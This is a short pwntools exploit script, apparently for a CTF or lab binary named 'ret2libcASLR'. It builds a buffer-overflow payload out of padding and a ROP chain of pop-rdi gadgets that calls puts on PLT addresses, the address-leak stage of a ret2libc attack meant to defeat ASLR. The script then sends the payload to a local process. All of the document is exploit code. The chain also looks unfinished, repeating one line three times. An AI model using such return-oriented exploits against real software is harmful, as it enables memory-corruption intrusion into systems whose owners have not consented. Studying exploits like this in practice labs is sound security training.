from pwn import *

context.binary = binary = ELF("./ret2libcASLR", checksec = False)
context.log_level = "debug"

pop_rdi_gadget = p64(0x00000000000011f1)
pop_rsi_gadget = p64(0x00000000000011fe)
pop_rdx_gadget = p64(0x000000000000120b)
pop_rcx_gadget = p64(0x0000000000001218)


ret = p64(0x000000000000101a)

main_addr = p64(binary.symbols.main)
plt_puts_addr = p64(binary.plt.puts)
plt_fopen_addr = p64(binary.plt.fopen)
plt_fwrite_addr = p64(binary.plt.fwrite)


payload = b"A" * 0x28 + ret
payload += pop_rdi_gadget + main_addr + plt_puts_addr
payload += pop_rdi_gadget + plt_fopen_addr + plt_puts_addr
payload += pop_rdi_gadget + plt_fopen_addr + plt_puts_addr
payload += pop_rdi_gadget + plt_fopen_addr + plt_puts_addr

p = process()
p.sendline(payload)
output = p.recv().split(b"\n")
print(output)
